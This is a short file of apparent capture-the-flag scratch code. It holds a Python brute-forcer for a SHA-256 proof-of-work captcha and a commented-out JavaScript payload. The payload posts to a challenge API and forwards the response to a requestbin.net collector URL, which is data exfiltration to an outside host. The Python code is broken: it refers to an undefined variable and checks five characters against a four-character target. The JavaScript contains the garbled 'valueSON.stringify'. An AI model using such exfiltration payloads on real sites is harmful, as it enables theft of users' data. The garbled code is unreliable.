import hashlib

def solve_capcha(capcha):
    i = 0
    while True:
        value = str(i).encode()
        if hashlib.sha256(value).hexdigest()[:5] == val:
            print(value)
            return value
        i += 1
solve_capcha('de52')



# let data = {raw: "barium"};

# fetch("http://web.challenge.bi0s.in:5432/api/filter", {
#       method: "POST", 
#       body: valueSON.stringify(data),
#     mode:"no-cors"
#     }).then(response => response.text())
#             .then((response) => {
#                 fetch("http://requestbin.net/r/ftyiv46g/?cc="+response,{mode:"no-cors"})
#             })